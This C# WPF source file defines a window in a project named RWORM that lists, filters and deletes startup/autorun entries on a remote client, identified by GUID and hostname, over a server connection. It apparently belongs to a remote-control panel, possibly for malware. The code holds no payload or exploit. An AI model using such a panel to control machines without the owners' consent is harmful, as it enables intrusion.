using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class AutorunManagerWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string _guid;
        private List<StartupItemDto> _allEntries = new();

        public class StartupItemDto
        {
            public string Scope { get; set; } = string.Empty;
            public string Name { get; set; } = string.Empty;
            public string Command { get; set; } = string.Empty;
            public string Location { get; set; } = string.Empty;
        }

        public AutorunManagerWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid = guid;
            Title = $"Startup & Autorun Manager — {hostname}";
            TitleLabel.Text = hostname;

            _server.RegisterStartupHandler(_guid, OnStartupReceived);
            _ = _server.RequestStartupEntries(_guid);
            StatusLabel.Text = "Loading startup entries...";
        }

        protected override void OnClosed(EventArgs e)
        {
            _server.UnregisterStartupHandler(_guid);
            base.OnClosed(e);
        }

        private void OnStartupReceived(byte[] data)
        {
            try
            {
                var json = Encoding.UTF8.GetString(data);
                var list = JsonSerializer.Deserialize<List<StartupItemDto>>(json,
                    new JsonSerializerOptions { PropertyNameCaseInsensitive = true }) ?? new List<StartupItemDto>();

                _allEntries = list;
                Dispatcher.BeginInvoke(new Action(() =>
                {
                    ApplyFilter();
                    StatusLabel.Text = $"{list.Count} autorun entries loaded.";
                }));
            }
            catch (Exception ex)
            {
                Dispatcher.BeginInvoke(new Action(() => StatusLabel.Text = $"Error: {ex.Message}"));
            }
        }

        private void ApplyFilter()
        {
            var q = SearchBox.Text?.Trim().ToLowerInvariant() ?? "";
            if (string.IsNullOrEmpty(q))
            {
                StartupGrid.ItemsSource = _allEntries;
            }
            else
            {
                StartupGrid.ItemsSource = _allEntries.Where(x =>
                    (x.Name != null && x.Name.ToLowerInvariant().Contains(q)) ||
                    (x.Command != null && x.Command.ToLowerInvariant().Contains(q)) ||
                    (x.Location != null && x.Location.ToLowerInvariant().Contains(q)) ||
                    (x.Scope != null && x.Scope.ToLowerInvariant().Contains(q))).ToList();
            }
        }

        private void SearchBox_TextChanged(object sender, TextChangedEventArgs e) => ApplyFilter();

        private void Refresh_Click(object sender, RoutedEventArgs e)
        {
            StatusLabel.Text = "Refreshing...";
            _ = _server.RequestStartupEntries(_guid);
        }

        private void Delete_Click(object sender, RoutedEventArgs e)
        {
            if (StartupGrid.SelectedItem is not StartupItemDto item)
            {
                MessageBox.Show("Select an entry first.", "Autorun Manager", MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }

            var confirm = MessageBox.Show($"Remove startup entry '{item.Name}'?", "Confirm Delete",
                MessageBoxButton.YesNo, MessageBoxImage.Warning);
            if (confirm != MessageBoxResult.Yes) return;

            StatusLabel.Text = $"Removing '{item.Name}'...";
            _ = _server.DeleteStartupEntry(_guid, item.Scope, item.Name, item.Location, resp =>
            {
                Dispatcher.BeginInvoke(new Action(() =>
                {
                    var msg = Encoding.UTF8.GetString(resp);
                    StatusLabel.Text = msg;
                    
                    _ = _server.RequestStartupEntries(_guid);
                }));
            });
        }
    }
}
